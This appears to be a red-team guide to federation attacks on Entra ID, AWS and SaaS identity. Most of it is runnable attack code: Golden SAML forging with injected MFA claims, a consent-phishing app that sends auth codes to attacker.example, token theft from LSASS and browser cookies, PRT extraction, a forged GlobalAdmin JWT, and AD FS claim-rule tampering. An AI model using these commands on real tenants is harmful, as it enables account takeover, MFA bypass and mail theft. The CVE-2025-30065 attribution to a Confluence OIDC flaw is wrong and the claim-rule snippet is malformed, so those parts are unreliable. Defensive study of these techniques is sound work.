# Cloud Identity Attack — Federation Abuse Deep Dive

> Companion to `SKILL.md` and `payloads.md`. This guide covers advanced federation abuse techniques: SAML token forging (Golden SAML), OAuth consent phishing, OIDC confusion, JWT algorithm confusion, refresh token theft, PRT abuse, and federation trust manipulation.

---

## Overview

Federation is the backbone of modern cloud identity. Entra ID trusts AD FS, Okta, Ping, and other IdPs via cryptographically-signed SAML or OIDC tokens. AWS IAM Identity Center trusts these IdPs via SAML. Google Workspace trusts via OIDC federation. The moment an attacker compromises a federation trust — by stealing a signing key, forging an assertion, abusing an OAuth consent, or confusing a JWT verifier — they collapse the perimeter for every relying party in the federation graph.

This guide is the deep-dive counterpart to the playbook (`cloud-identity-attack-playbook.md`). It is structured for the experienced red teamer who needs to understand *why* each technique works, not just *what* command to run. Each section ends with hands-on Azure CLI / PowerShell commands that you can run against a test tenant (Microsoft 365 Developer Program or Okta Developer) to validate the attack path.

The recurring lesson: federation trust is brittle. A single compromised signing key forges unlimited identities. A single illicit consent grant reads all mail. A single PRT bypasses MFA on every device-joined endpoint. Defenders underinvest in federation monitoring; attackers know this.

---

## SAML Token Forging (Golden SAML)

### Background

Golden SAML is the cloud analog of Golden Ticket. In on-prem AD, the attacker forges a Kerberos TGT using the `krbtgt` hash. In federated cloud, the attacker forges a SAML assertion using the IdP's TokenSigning certificate. Both attacks share the same property: the verifier (the relying party) cannot distinguish a forged token from a legitimate one, because the signature is cryptographically valid.

The TokenSigning certificate lives on the AD FS server, in the AD DS database (the `ADFS` container under `CN=Configuration,DC=...`), protected by the AD FS Distributed Key Manager (DKM). It is also replicated to every AD FS server. With Domain Admin or Local Admin on the AD FS server, the attacker can extract the cert and its private key. Mandiant and CyberArk have published extensive research on this.

### Forge a SAML Assertion

Once you have the cert + private key (e.g., `TokenSigning.pfx`), forging an assertion is a single AADInternals command:

```powershell
Import-Module AADInternals

# Load the TokenSigning cert
$cert = Import-PfxCertificate -FilePath TokenSigning.pfx `
    -Password (ConvertTo-SecureString 'pfxpassword' -AsPlain -Force)

# Forge an assertion as victim@corp.com with MFA claim
$token = New-AADIntSAMLToken `
    -ImmutableId 'victim@corp.com' `
    -Issuer 'http://adfs.corp.com/adfs/services/trust' `
    -Certificate $cert `
    -Audience 'urn:federation:MicrosoftOnline' `
    -Expiry (Get-Date).AddHours(2) `
    -MFA `
    -IncludeAuthenticationMethod

# Exchange the SAML assertion for an Entra ID access token
Open-AADIntOffice365Portal -SAMLToken $token

# Verify
Get-AADIntUser -AccessToken $token
```

The `-MFA -IncludeAuthenticationMethod` flags are critical: they inject an authentication-context-class-ref claim (`http://schemas.microsoft.com/claims/multipleauthn`) that Entra ID's Conditional Access policy accepts as proof of MFA. The user never sees a push, a code, or a prompt.

### Forging AWS IAM Identity Center Assertions

The same technique works against AWS IC. The audience changes to `https://signin.aws.amazon.com/saml`, and the assertion must include a `Role` attribute with comma-separated `RoleArn,PrincipalArn` pairs:

```bash
ASSERTION_B64=$(base64 -w0 forged_assertion.xml)

aws sts assume-role-with-saml \
    --role-arn "arn:aws:iam::111122223333:role/MyRole" \
    --principal-arn "arn:aws:iam::111122223333:saml-provider/EntraId" \
    --saml-assertion "$ASSERTION_B64" \
    --duration-seconds 3600
```

---

## OAuth Consent Phishing (Illicit Consent Grant)

### Background

OAuth consent grants are a powerful but underappreciated persistence vector. When a user consents to an app, they create an entry in `oauth2PermissionGrants` that allows the app to read mail, files, profile — whatever scopes were consented — using the user's identity. The app does not need the user's password. The grant persists across password resets and MFA re-enrollments. If the consent was tenant-wide (admin consent), the app can read *any* user's mail.

The attacker registers a malicious app in their own Entra ID tenant (free tier is sufficient), configures redirect URI to a domain they control, and constructs a consent URL with high-privilege scopes (`Mail.Read offline_access`). They phish the URL; the victim clicks; Microsoft redirects to the attacker with an auth code; the attacker exchanges the code for access + refresh tokens. The refresh token persists indefinitely.

### Step-by-Step

```bash
# In the attacker's tenant:
az ad app create \
    --display-name "Contoso-Backup-Sync" \
    --required-resource-accesses '[{"resourceAppId":"00000003-0000-0000-c000-000000000000","resourceAccess":[{"id":"024d486e-b451-40bb-833d-3e28d5d60bb0","type":"Scope"}]}]'

az ad sp create --id <app-id>

# Construct admin consent URL
CONSENT_URL="https://login.microsoftonline.com/organizations/v2.0/adminconsent?client_id=<app-id>&scope=https://graph.microsoft.com/Mail.Read offline_access&redirect_uri=https://attacker.example/callback"

# Phish the URL to a Global Admin for tenant-wide consent (CRITICAL),
# or to any user for user-scoped consent (still sufficient for Mail.Read)

# At the attacker's callback, exchange the auth code:
curl -X POST https://login.microsoftonline.com/common/oauth2/v2.0/token \
    -d "client_id=$APP_ID" \
    -d "client_secret=$SECRET" \
    -d "scope=https://graph.microsoft.com/Mail.Read offline_access" \
    -d "code=$CODE" \
    -d "redirect_uri=$REDIRECT_URI" \
    -d "grant_type=authorization_code"

# Read victim mail
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
    https://graph.microsoft.com/v1.0/me/messages
```

The persistence is subtle: even if the user changes their password, the OAuth grant is independent. To remove it, the user must explicitly revoke consent in MyApps → Permissions, or an admin must delete the grant via Graph API.

---

## OIDC Confusion Attacks (CVE-2025-30065 Class)

### Background

OIDC confusion arises when a relying party accepts a token minted for one client as if it were for another. CVE-2025-30065 (in Atlassian Confluence) was a representative example: an attacker could use a token issued by the IdP for an unprivileged client application to authenticate to a privileged client application, because the relying party did not validate the `aud` (audience) claim correctly.

The general class includes:

- **Audience confusion**: The RP ignores `aud` and accepts any token signed by the IdP.
- **Issuer confusion**: The RP accepts tokens from multiple issuers without pinning.
- **Subject confusion**: The RP uses `sub` (subject) without verifying the `iss` (issuer).

### Exploitation Pattern

If the engagement target is a SaaS application that federates with Entra ID via OIDC, send a token issued by Microsoft Graph (audience `00000003-0000-0000-c000-000000000000`) to the target's `/login/callback` endpoint. If the target accepts it, audience confusion is present.

```bash
# Acquire a token for Microsoft Graph
TOKEN=$(az account get-access-token --resource-type ms-graph --query accessToken -o tsv)

# Replay against target SaaS callback
curl -X POST https://target.example/login/callback \
    -H "Content-Type: application/json" \
    -d "{\"id_token\":\"$TOKEN\"}"
```

---

## JWT Signature Confusion (RS256 → HS256, alg=none)

### Background

JWT supports multiple algorithms: RS256 (RSA-signed), HS256 (HMAC), ES256 (ECDSA), and `none` (no signature). The classic confusion attack exploits libraries that accept attacker-specified algorithms:

1. **alg=none**: The attacker changes the header `alg` to `none`, removes the signature, and the verifier accepts.
2. **RS256 → HS256**: The verifier uses the public RSA key as an HMAC secret. The attacker, who knows the public key, can HMAC-sign forged tokens.

### Forge a Token (Test Only)

```python
import jwt
import base64

# Acquire the public key from the IdP's OpenID config
JWKS_URI = "https://login.microsoftonline.com/common/discovery/v2.0/keys"

# Use the public key as HMAC secret (HS256)
public_key_pem = "-----BEGIN CERTIFICATE-----\n...\n-----END CERTIFICATE-----"

forged_payload = {
    "iss": "https://login.microsoftonline.com/<tenant>/",
    "aud": "<target-app-id>",
    "sub": "victim@corp.com",
    "exp": 9999999999,
    "roles": ["GlobalAdmin"]
}

forged = jwt.encode(forged_payload, public_key_pem, algorithm="HS256")
print(forged)
```

Modern Microsoft.IdentityModel libraries reject `alg=none` and HS256 with RSA keys by default, but legacy libraries (e.g., older `System.IdentityModel.Tokens.Jwt`) and many third-party IdPs are still vulnerable.

---

## Refresh Token Theft

### Background

Refresh tokens are the crown jewels of cloud identity. Unlike access tokens (1-hour TTL), refresh tokens live for 90 days by default in Entra ID, and can be revoked only explicitly. With a refresh token, the attacker silently mints new access tokens across the 90-day window, maintaining persistence without re-authentication.

Sources of refresh tokens:

- **Browser cookies**: The `ESTSAUTH` / `ESTSAUTHPERSISTENT` cookies in Edge / Chrome contain the refresh token material. Stealing the cookie database gives the attacker a session.
- **LSASS (WAM)**: On Windows 10+, the Web Account Manager (WAM) caches tokens in LSASS. AADInternals' `Get-AADIntTokens` extracts them.
- **.roadtools_auth**: The ROADtools local cache after `roadrecon auth`.
- **Azure CLI token cache**: `~/.azure/msal_token_cache.json`.

### Hands-on

```powershell
# Extract WAM tokens from LSASS (requires local admin on victim)
Import-Module AADInternals
Get-AADIntTokens

# Or, if you have a cookie dump from Chrome
# Parse the encrypted cookie store and extract ESTSAUTHPERSISTENT
# Then replay:
curl -b "ESTSAUTHPERSISTENT=$COOKIE" https://login.microsoftonline.com/login.srf
```

---

## PRT (Primary Refresh Token) Abuse

### Background

The Primary Refresh Token is the master credential for Entra ID-joined devices. It is a long-lived, MFA-aware token stored in the TPM of a Microsoft Entra-joined or Microsoft Entra-hybrid-joined Windows device. With the PRT, an attacker can mint access tokens for any user signed in to the device, with full MFA claim.

The PRT is protected by the TPM, but AADInternals' `Get-AADIntPRTToken` can extract PRT material if the attacker has Local Admin + the ability to invoke `PassThePRT`. The technique is documented in Mandiant and Microsoft research.

### Hands-on

```powershell
# Extract PRT (requires Local Admin on Entra-joined device)
Get-AADIntPRTToken

# Use PRT to acquire access token for any user
Get-AADIntAccessTokenWithPRT -PRTToken $prt -Resource "https://graph.microsoft.com"
```

---

## Federation Trust Manipulation

### Background

Federation trust is configured between the IdP and RP via:

- **AD FS**: A relying-party trust with the RP's identifier, signature verification cert, and claim rules.
- **Okta**: An OIDC or SAML app integration with audience restriction and signature verification.
- **Ping**: A federation connection with similar properties.

An attacker with admin on the IdP can modify trust relationships: add a new RP, change claim rules to inject elevated groups, or replace the signing cert with one they control.

### Manipulate AD FS Claim Rules

```powershell
# Add a claim rule that injects an admin group for all users
Set-AdfsRelyingPartyTrust -TargetIdentifier "urn:federation:MicrosoftOnline" `
    -IssuanceTransformRules '@
    => issue(Type = "http://schemas.microsoft.com/ws/2008/06/identity/claims/role", Value = "GlobalAdmin");'
```

---

## Hands-on: Defensive Audit

Run the following to audit your own tenant's federation posture:

```bash
# Enumerate federated domains
az rest --method get --url "https://graph.microsoft.com/v1.0/domains?\$select=id,authenticationType,isVerified"

# List service principals with appRoleAssignmentRequired = false
az rest --method get --url "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=appRoleAssignmentRequired eq false"
```

---

## References

1. CyberArk — Golden SAML research (2017) — https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-identity-to-cloud-services
2. Mandiant — ADFS DKM / Golden SAML extraction — https://www.mandiant.com/resources/blog/abusing-digital-key-certificate-adfs
3. Microsoft Security Response Center — Detecting AD FS cert abuse — https://www.microsoft.com/en-us/security/blog/2021/01/06/detecting-and-mitigating-adfs-token-signing-certificate-abuse/
4. AADInternals — Dr. Nestori Syynimaa — https://aadinternals.com/
5. ROADtools — https://github.com/dirkjanm/ROADtools
6. Mandiant — Illicit consent grant detection — https://www.mandiant.com/resources/blog/illicit-consent-abuse
7. Microsoft — OAuth app consent attacks — https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/detect-and-remediate-illicit-consent-grants
8. Auth0 — JWT algorithm confusion — https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
9. CVE-2025-30065 — Atlassian Confluence OIDC confusion — https://confluence.atlassian.com/security/cve-2025-30065
10. Mandiant — PRT abuse research — https://www.mandiant.com/resources/blog/abusing-azure-ad-primary-refresh-token
11. Microsoft — Conditional Access and device trust — https://learn.microsoft.com/en-us/entra/identity/conditional-access/
12. NIST SP 800-63C — Federation assurance — https://pages.nist.gov/800-63-3/sp800-63c.html
13. OWASP — JWT attack playbook — https://owasp.org/www-community/attacks/JSON_Web_Token_(JWT)_Cheat_Sheet_for_Java
14. Microsoft Threat Intelligence — Storm-0558 token forgery (2023) — https://www.microsoft.com/en-us/security/blog/2023/08/02/microsoft-threat-intelligence-storm-0558/
